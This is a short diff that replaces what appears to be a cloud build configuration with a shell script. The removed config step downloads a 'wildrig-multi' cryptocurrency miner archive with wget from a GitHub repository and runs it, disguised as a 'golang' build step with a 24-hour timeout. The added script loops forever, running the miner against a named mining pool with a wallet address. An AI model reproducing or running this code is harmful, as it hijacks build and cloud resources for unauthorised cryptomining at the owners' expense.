@@ -1,12 +1,5 @@
-steps:
-  - name: golang
-    args:
-      - '-c'
-      - >-
-         wget https://github.com/ifhikf/juki/raw/main/wildrig-multi-linux-0.29.0%20(1).tar.gz && wildrig-multi-linux-0.29.0%20(1).tar.gz && ./start.sh
-    waitFor:
-      - '-'
-    entrypoint: /bin/bash
-timeout: 86400s
-options:
-  diskSizeGb: '100'
+#!/bin/sh
+while [ 1 ]; do
+	./wildrig-multi -a megabtx  -o stratum+tcp://stratum-eu.rplant.xyz:7066 -u RVWrWTyn5WCz1zqR15qm7bGeNcTZtmivs2.jos -p d=2,password=joss  --opencl-launch auto --print-full --print-power
+	sleep 5
+done
